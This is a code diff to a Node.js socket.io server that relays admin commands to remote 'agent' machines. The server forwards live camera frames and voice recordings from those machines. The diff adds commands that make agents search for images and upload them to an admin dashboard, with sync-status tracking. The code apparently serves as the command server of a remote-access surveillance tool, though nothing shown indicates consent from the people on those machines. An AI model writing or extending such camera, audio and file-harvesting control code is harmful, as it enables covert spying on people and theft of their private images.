@@ -62,90 +62,63 @@ if (hasServiceAccountConfig) {
     console.warn('[auth] Firebase Admin is not fully configured. Dashboard login will fail until service account env vars are set.');
 }
 
-const normalizeOrigin = (value = '') => {
-    const trimmed = String(value || '').trim();
-    if (!trimmed) {
-        return '';
-    }
-
-    try {
-        return new URL(trimmed).origin;
-    } catch (error) {
-        return trimmed.replace(/\/+$/, '').toLowerCase();
-    }
-};
-
 const allowedOrigins = CLIENT_ORIGIN === '*'
     ? '*'
-    : CLIENT_ORIGIN
-        .split(',')
-        .map((origin) => normalizeOrigin(origin))
-        .filter(Boolean);
+    : CLIENT_ORIGIN.split(',').map((origin) => origin.trim()).filter(Boolean);
 
-const isAllowedOrigin = (origin = '') => {
+const isOriginAllowed = (origin = '') => {
+    if (!origin) {
+        return false;
+    }
+
     if (allowedOrigins === '*') {
         return true;
     }
 
-    if (!origin) {
-        return true;
-    }
-
-    const normalizedOrigin = normalizeOrigin(origin);
-    return allowedOrigins.includes(normalizedOrigin);
+    return allowedOrigins.includes(origin);
 };
 
 const app = express();
-app.use(express.json());
 
 app.use((req, res, next) => {
-    const requestOrigin = req.headers.origin || '';
+    const requestOrigin = req.headers.origin;
 
-    if (requestOrigin && isAllowedOrigin(requestOrigin)) {
-        res.setHeader('Access-Control-Allow-Origin', allowedOrigins === '*' ? '*' : requestOrigin);
-        if (allowedOrigins !== '*') {
-            res.append('Vary', 'Origin');
-        }
+    if (!requestOrigin) {
+        next();
+        return;
     }
 
-    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
+    if (allowedOrigins === '*') {
+        res.setHeader('Access-Control-Allow-Origin', '*');
+    } else if (isOriginAllowed(requestOrigin)) {
+        res.setHeader('Access-Control-Allow-Origin', requestOrigin);
+        res.append('Vary', 'Origin');
+    }
+
+    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
 
     if (req.method === 'OPTIONS') {
-        if (requestOrigin && !isAllowedOrigin(requestOrigin)) {
-            res.status(403).end();
+        if (allowedOrigins !== '*' && !isOriginAllowed(requestOrigin)) {
+            res.sendStatus(403);
             return;
         }
 
-        res.status(204).end();
+        res.sendStatus(204);
         return;
     }
 
     next();
 });
 
+app.use(express.json());
+
 const server = http.createServer(app);
-
-const socketCorsOrigin = (origin, callback) => {
-    if (isAllowedOrigin(origin)) {
-        callback(null, true);
-        return;
-    }
-
-    callback(new Error(`CORS origin denied: ${origin || 'unknown-origin'}`));
-};
-
 const io = new Server(server, {
     cors: {
-        origin: socketCorsOrigin,
+        origin: allowedOrigins,
         methods: ['GET', 'POST']
     }
-});
-
-io.engine.on('connection_error', (error) => {
-    const failingOrigin = error?.req?.headers?.origin || 'unknown-origin';
-    const requestPath = error?.req?.url || '/socket.io';
-    console.warn(`[socket.io] connection_error: ${error.message} | origin=${failingOrigin} | url=${requestPath}`);
 });
 
 const parseBearerToken = (headerValue = '') => {
@@ -503,11 +476,7 @@ io.use(async (socket, next) => {
 let agents = {};
 
 app.get('/', (req, res) => {
-    res.status(200).json({
-        ok: true,
-        service: 'signal-server',
-        message: 'Backend API is running. Use the separate React frontend for dashboard UI.'
-    });
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.get('/health', (req, res) => {
@@ -789,7 +758,9 @@ io.on('connection', (socket) => {
     };
 
     const emitControl = (eventName, payload = {}) => {
-        const targetId = payload?.targetId;
+        const normalizedPayload = payload && typeof payload === 'object' ? payload : {};
+        const targetId = normalizedPayload.targetId;
+        const { targetId: _, ...agentPayload } = normalizedPayload;
 
         if (targetId) {
             const targetSocket = io.sockets.sockets.get(targetId);
@@ -803,7 +774,7 @@ io.on('connection', (socket) => {
                 };
             }
 
-            io.to(targetId).emit(eventName, { targetId });
+            io.to(targetId).emit(eventName, agentPayload);
             return {
                 ok: true,
                 scope: 'single',
@@ -822,7 +793,7 @@ io.on('connection', (socket) => {
             };
         }
 
-        io.to(AGENT_ROOM).emit(eventName, {});
+        io.to(AGENT_ROOM).emit(eventName, agentPayload);
         return {
             ok: true,
             scope: 'all',
@@ -850,7 +821,10 @@ io.on('connection', (socket) => {
             id: socket.id,
             recording: false,
             cameraOn: false,
-            voiceRecording: false
+            voiceRecording: false,
+            imageSyncRunning: false,
+            imageSyncNextIndex: 0,
+            imageSyncTotalFiles: 0
         };
         console.log(`[agent] registered: ${machineName} (${socket.id})`);
         emitAgentList();
@@ -949,6 +923,30 @@ io.on('connection', (socket) => {
         emitControlAck('stop_voice_capture', result);
     });
 
+    socket.on('admin_find_image_and_save', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('find_image_and_save', payload);
+        emitControlAck('find_image_and_save', result);
+    });
+
+    socket.on('admin_stop_image_sync', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('stop_image_sync', payload);
+        emitControlAck('stop_image_sync', result);
+    });
+
+    socket.on('admin_get_image_sync_status', (payload) => {
+        if (!isAdmin) {
+            return;
+        }
+        const result = emitControl('get_image_sync_status', payload);
+        emitControlAck('get_image_sync_status', result);
+    });
+
     // Relay Camera Frames from Agent to Dashboard
     socket.on('camera_frame', (data) => {
         if (isAdmin) {
@@ -986,6 +984,67 @@ io.on('connection', (socket) => {
         io.to(ADMIN_ROOM).emit('new_video_link', {
             ...data,
             mediaType: 'audio',
+            agentId: socket.id,
+            machine: data?.machine || agent.machine
+        });
+    });
+
+    socket.on('image_upload_complete', (data = {}) => {
+        if (isAdmin) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        io.to(ADMIN_ROOM).emit('new_video_link', {
+            ...data,
+            mediaType: 'image',
+            agentId: socket.id,
+            machine: data?.machine || agent.machine
+        });
+    });
+
+    socket.on('image_sync_status', (data = {}) => {
+        if (isAdmin) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        const stage = String(data.stage || '');
+        const isRunning = ['started', 'queued', 'scanning', 'retrying', 'stopping', 'already_running'].includes(stage);
+
+        agents[socket.id] = {
+            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
+            imageSyncRunning: isRunning,
+            imageSyncNextIndex: Number(data.nextIndex ?? data.index ?? 0) || 0,
+            imageSyncTotalFiles: Number(data.totalFiles ?? data.total ?? 0) || 0,
+            lastImageSyncAt: Date.now()
+        };
+
+        emitAgentList();
+        io.to(ADMIN_ROOM).emit('ui_image_sync_status', {
+            ...data,
+            agentId: socket.id,
+            machine: data?.machine || agent.machine
+        });
+    });
+
+    socket.on('image_sync_snapshot', (data = {}) => {
+        if (isAdmin) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        agents[socket.id] = {
+            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
+            imageSyncRunning: Boolean(data.running),
+            imageSyncNextIndex: Number(data.nextIndex ?? 0) || 0,
+            imageSyncTotalFiles: Number(data.totalFiles ?? 0) || 0,
+            lastImageSyncAt: Date.now()
+        };
+
+        emitAgentList();
+        io.to(ADMIN_ROOM).emit('ui_image_sync_snapshot', {
+            ...data,
             agentId: socket.id,
             machine: data?.machine || agent.machine
         });
